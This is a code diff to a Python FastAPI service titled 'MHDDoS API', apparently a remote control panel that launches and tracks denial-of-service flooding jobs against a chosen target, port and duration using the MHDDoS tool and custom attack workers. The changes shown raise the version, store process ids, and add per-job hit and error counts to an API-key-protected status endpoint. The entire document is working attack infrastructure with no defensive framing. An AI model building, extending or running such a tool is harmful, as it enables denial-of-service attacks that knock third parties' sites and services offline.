@@ -23,7 +23,7 @@ ALL_METHODS = L7_METHODS + L4_METHODS + CUSTOM_METHODS
 JOBS: dict[str, dict] = {}
 LOCK = threading.Lock()
 
-app = FastAPI(title="MHDDoS API", version="2.1")
+app = FastAPI(title="MHDDoS API", version="2.2")
 
 
 class AttackRequest(BaseModel):
@@ -48,7 +48,6 @@ def _count() -> int:
         return len(JOBS)
 
 
-# ── MHDDoS wrapper (fix C3: cwd มาจาก config) ──
 def build_cmd(method, target, port, duration, threads):
     if method in L7_METHODS:
         url = target if target.startswith("http") else f"http://{target}"
@@ -77,6 +76,7 @@ async def run_mhddos(job_id, method, target, port, duration, threads):
     with LOCK:
         if job_id in JOBS:
             JOBS[job_id]["proc"] = proc
+            JOBS[job_id]["pid"] = proc.pid
     await proc.wait()
     with LOCK:
         JOBS.pop(job_id, None)
@@ -96,6 +96,7 @@ async def run_custom(job_id, method, target, port, duration, threads):
     with LOCK:
         if job_id in JOBS:
             JOBS[job_id]["worker"] = worker
+            JOBS[job_id]["stats"] = stats
 
     try:
         await worker.run()
@@ -108,7 +109,7 @@ async def run_custom(job_id, method, target, port, duration, threads):
 
 @app.get("/")
 def root():
-    return {"name": "MHDDoS API", "version": "2.1",
+    return {"name": "MHDDoS API", "version": "2.2",
             "active": _count(), "max": MAX_CONC,
             "curl_cffi": HAS_CURL_CFFI,
             "mhddos_dir": MHDDOS_DIR}
@@ -121,11 +122,52 @@ def methods():
 
 
 @app.get("/status")
-def status():
+def status(job_id: str = None, key: str = Query("")):
+    """ถ้าใส่ job_id → คืนสถิติของ job นั้น"""
+    _check_key(key)
+
     with LOCK:
-        jobs = [{"job_id": k, "method": v["method"], "target": v["target"],
-                 "elapsed": int(time.time() - v["started"])}
-                for k, v in JOBS.items()]
+        if job_id:
+            job = JOBS.get(job_id)
+            if not job:
+                return {"exists": False, "job_id": job_id}
+            entry = {
+                "job_id": job_id,
+                "method": job["method"],
+                "target": job["target"],
+                "port": job["port"],
+                "duration": job["duration"],
+                "elapsed": int(time.time() - job["started"]),
+                "hits": 0,
+                "errors": 0,
+                "type": "custom" if job.get("worker") else "mhddos",
+            }
+            stats = job.get("stats")
+            if stats:
+                entry["hits"] = stats.get("hits", 0)
+                entry["errors"] = stats.get("errors", 0)
+                if "last_error" in stats:
+                    entry["last_error"] = stats["last_error"]
+            return entry
+
+        # ไม่ใส่ job_id → คืนรายการทั้งหมด
+        jobs = []
+        for k, v in JOBS.items():
+            entry = {
+                "job_id": k,
+                "method": v["method"],
+                "target": v["target"],
+                "elapsed": int(time.time() - v["started"]),
+                "hits": 0,
+                "errors": 0,
+                "type": "custom" if v.get("worker") else "mhddos",
+            }
+            stats = v.get("stats")
+            if stats:
+                entry["hits"] = stats.get("hits", 0)
+                entry["errors"] = stats.get("errors", 0)
+            jobs.append(entry)
+
     return {"active": len(jobs), "max": MAX_CONC, "jobs": jobs}
 
 
@@ -150,6 +192,7 @@ async def attack(req: AttackRequest, key: str = Query("")):
             "job_id": job_id, "method": method, "target": req.target,
             "port": req.port, "duration": req.duration, "threads": threads,
             "started": time.time(), "proc": None, "worker": None,
+            "stats": None,
         }
 
     if method in CUSTOM_METHODS:
